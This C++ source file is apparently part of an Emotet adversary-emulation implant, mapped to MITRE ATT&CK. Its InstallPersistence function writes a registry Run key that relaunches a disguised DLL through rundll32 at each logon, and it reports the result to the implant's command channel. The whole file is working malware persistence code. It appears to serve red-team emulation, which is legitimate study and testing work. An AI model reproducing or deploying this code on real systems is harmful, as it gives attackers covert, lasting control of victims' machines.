#include "pch.h"
#include "persistence.h"
#include "hostdiscovery.h"
#include "comms.h"

/*
 * InstallPersistence:
 *      About:
 *          Establishes persistence via Windows Registry Run Key
 *          that restarts the implant across reboots and relog-in
 *          by the current user
 *      Artifacts:
 *          Creates new value in HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 *      MITRE ATT&CK Techniques:
 *          T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
 *      Result:
 *          Returns boolean on success/failure
 *      Source:
 *          https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/
 */
bool InstallPersistence(EmotetComms* comms) {
    HKEY hKey;
    LPCSTR keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyA(
        HKEY_CURRENT_USER, keyPath, &hKey) != ERROR_SUCCESS) {
        printf("Error opening Registry");
        return false;
    }

    LPCSTR value = "blbdigital\0";
    string data = "rundll32.exe " + getUserRootDirectory() + "\\Ygyhlqt\\Bx5jfmo\\R43H.dll,Control_RunDLL";

    if (RegSetValueExA(
        hKey, value, 0, REG_SZ, (const BYTE*)data.c_str(), data.size() + 1) != ERROR_SUCCESS) {
        printf("Error writing key\n");
        comms->sendOutput("unable to write to registry");
        RegCloseKey(hKey);
        return false;
    }
    RegCloseKey(hKey);
    return comms->sendOutput("successfully installed persistence");
}